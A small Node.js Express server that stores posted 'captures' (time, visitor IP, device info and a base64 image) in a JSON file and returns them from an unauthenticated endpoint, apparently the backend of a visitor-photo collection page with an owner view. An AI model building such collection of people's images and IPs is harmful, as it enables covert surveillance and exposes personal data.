const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: "10mb" })); // allow base64 images
app.use(express.static(path.join(__dirname, "public"))); // serve index.html + owner.html

const DATA_FILE = path.join(__dirname, "captures.json");

// Save capture
app.post("/save-capture", (req, res) => {
  const { time, ip, device, img } = req.body;

  let captures = [];
  if (fs.existsSync(DATA_FILE)) {
    captures = JSON.parse(fs.readFileSync(DATA_FILE));
  }

  captures.push({ time, ip, device, img });
  fs.writeFileSync(DATA_FILE, JSON.stringify(captures, null, 2));

  res.json({ success: true });
});

// Get captures
app.get("/get-captures", (req, res) => {
  if (fs.existsSync(DATA_FILE)) {
    res.json(JSON.parse(fs.readFileSync(DATA_FILE)));
  } else {
    res.json([]);
  }
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
